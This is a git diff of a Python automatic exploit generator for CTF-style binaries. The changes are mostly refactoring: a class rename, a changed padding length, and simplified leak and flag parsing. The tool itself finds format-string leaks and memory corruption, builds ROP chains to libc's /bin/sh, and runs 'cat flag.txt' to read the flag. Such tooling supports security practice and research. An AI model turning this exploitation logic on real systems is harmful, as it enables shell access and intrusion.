@@ -5,6 +5,7 @@ import argparse
 import ropgadget
 import r2pipe
 
+from capstone import *
 from pwn import *
 from binascii import *
 
@@ -51,7 +52,7 @@ arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
 useful_rop_functions = ["__libc_csu_init"]
 
 
-class rAEG:
+class Raeg:
     # Initialize class variables that are important here
     def __init__(self, binary_path, libc_path):
         self.binary = binary_path
@@ -85,10 +86,14 @@ class rAEG:
     # Also determine the parameters needed, and the function to execute
     def find_vulnerability(self):
 
+        #self.core_smash()
+
+
         self.angry_analyze()
 
         if self.has_leak:
             logger.info(f"Found a format string vulnerability")
+
 
             symbols = []
             if "pwnme" in self.elf.sym.keys():
@@ -124,12 +129,14 @@ class rAEG:
                     logger.info("Found a libc leak")
                     self.generate_rop_chain()
 
+
         else:
             p = process(self.binary)
             prompt = p.recvline()
 
             if b"0x" in prompt:
                 self.has_libc_leak = True
+
 
             for s in strings:
                 output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
@@ -171,10 +178,12 @@ class rAEG:
                 self.exploit_function = "puts"
                 logger.info("Found puts function")
 
+
             # Set functions and parameters as a dictionary set
 
             self.parameters = params
             self.generate_rop_chain()
+
 
     # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
     def check_mem_corruption(self, simgr):
@@ -558,9 +567,9 @@ class rAEG:
         logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
 
 
-        #padding_len = 248
+        padding_len = 248
         #padding_len = 152
-        padding_len = 88
+        #padding_len = 88
         #padding_len = 216
 
         #chain = self.symbolic_padding
@@ -575,10 +584,9 @@ class rAEG:
         p.sendline(chain)
         p.sendline(b"cat flag.txt")
         try:
-            output = p.recvall(timeout=2)
-            if b"flag" in output:
-                self.flag = b"flag{" + output.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
-                self.flag = self.flag.decode()
+            output = p.recvuntil(b"}").decode().split("\n")[-1]
+            if self.flag == None:
+                self.flag = output
         except:
             logger.info("ROP chain exploit failed")
 
@@ -787,22 +795,12 @@ class rAEG:
             if "Leak" in line:
                 debug_output = line
 
-
-        #print(f"Leak: {debug_output}")
-        #print(f"Base: {libc_base_debug}")
-
-
         debug_ouput = debug_output.split("Leak")
 
-        leak_address = re.findall(r"0x7f[A-Fa-f0-9]+", debug_output)
-        #print("\n\n")
-        #print(f"Leak: {leak_address}")
-        leak_address = leak_address[-1]
+        leak_address = re.findall(r"0x7f[A-Fa-f0-9]+", debug_output)[0]
         libc_base_address = re.search(r"0x[0]+7f[A-Fa-f0-9]+", libc_base_debug)
 
         leak_address = int(leak_address, 16)
-        #print(f"Base: {libc_base_address}")
-
         if libc_base_address:
             libc_base_address = int(libc_base_address.group(),16)
 
@@ -875,7 +873,7 @@ if __name__ == "__main__":
     #parser.add_argument("bin",  help="path of the binary to exploit")
     
     arguments = parser.parse_args()
-    rage = rAEG(args.BIN, "/opt/libc.so.6")
+    rage = Raeg(args.BIN, "/opt/libc.so.6")
 
     rage.find_vulnerability()
 
